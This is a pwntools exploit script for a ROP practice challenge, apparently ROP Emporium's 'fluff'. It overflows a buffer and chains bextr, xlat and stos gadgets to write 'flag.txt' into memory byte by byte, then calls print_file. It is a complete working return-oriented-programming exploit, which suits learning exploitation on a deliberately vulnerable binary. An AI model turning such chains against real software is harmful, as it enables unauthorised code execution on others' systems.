#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
tb *(&pwnme+152)
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    rw_mem = 0x0000000000601230

    pop_rdi = p64(0x00000000004006a3)
    ret = p64(0x0000000000400295)
    # stos   BYTE PTR es:[rdi],al
    stos = p64(0x0000000000400639)
    # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    bextr = p64(0x000000000040062a)
    # xlat   BYTE PTR ds:[rbx]
    xlat = p64(0x0000000000400628)
    # mov eax, 0; pop rbp; ret;
    zero_eax = p64(0x0000000000400610)

    # ROPgadget --binary fluff --memstr flag.txt
    letters = [
            0x00000000004003c4, # f
            0x0000000000400239, # l 
            0x00000000004003d6, # a
            0x00000000004003cf, # g
            0x000000000040024e, # .
            0x0000000000400192, # t
            0x0000000000400246, # x
            0x0000000000400192  # t
            ]

    ### attack
    garbage = b"A"*40

    rop = b""

    # set rdi once and keep as a ptr to string
    rop += pop_rdi
    rop += p64(rw_mem)
    rop += zero_eax
    rop += p64(0) # garbage for rbp

    for i in range(len(letters)):
        # we need to set `rbx` first but this requires extra work
        rop += bextr
        rop += p64(0x2400) # pop rdx - lower 8 bits specify the starting bit position in rcx from which to begin extraction, The next 8 bits specify the number of bits to extract from rcx.
        rop += p64(letters[i] - 0x3ef2 - ord('flag.txt\0'[i-1])) # pop rcx - the source operand from which bits will be extracted. / we need to sub 0x3ef2

        # rbx will hold the result of the above
        # then, we're using `rbx` with `xlat`
        rop += xlat

        # finally, having `al` set, we can use `stos`
        rop += stos

    # load address again and load target fn
    rop += pop_rdi
    rop += p64(rw_mem)

    rop += ret # align stack
    rop += p64(elf.plt['print_file'])

    payload = garbage + rop
    send(payload)

    ### shell
    io.interactive()
